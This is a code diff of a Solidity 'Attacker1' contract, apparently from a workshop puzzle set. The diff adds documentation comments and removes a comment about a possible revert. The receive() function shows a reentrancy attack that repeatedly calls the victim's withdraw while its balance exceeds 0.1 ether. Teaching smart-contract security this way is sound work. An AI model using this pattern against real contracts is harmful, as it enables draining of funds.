@@ -18,6 +18,9 @@ Glad to prepare and present the materials for Game Day Remix in DevConnect Amste
 pragma solidity 0.8.6;
 import "./interface/IVictim.sol";
 
+/// @title Attacker1
+/// @notice Attacker contract for puzzle 1
+/// @author Verilog Solutions
 contract Attacker1 {
 	IVictim public victim;
 
@@ -31,8 +34,6 @@ contract Attacker1 {
 	}
 
 	receive() external payable {
-		// may be a better expression in if statement,
-		// this version may lead to REVERT;
 		if (address(victim).balance > 0.1 ether) {
 			victim.withdraw(address(this));
 		}
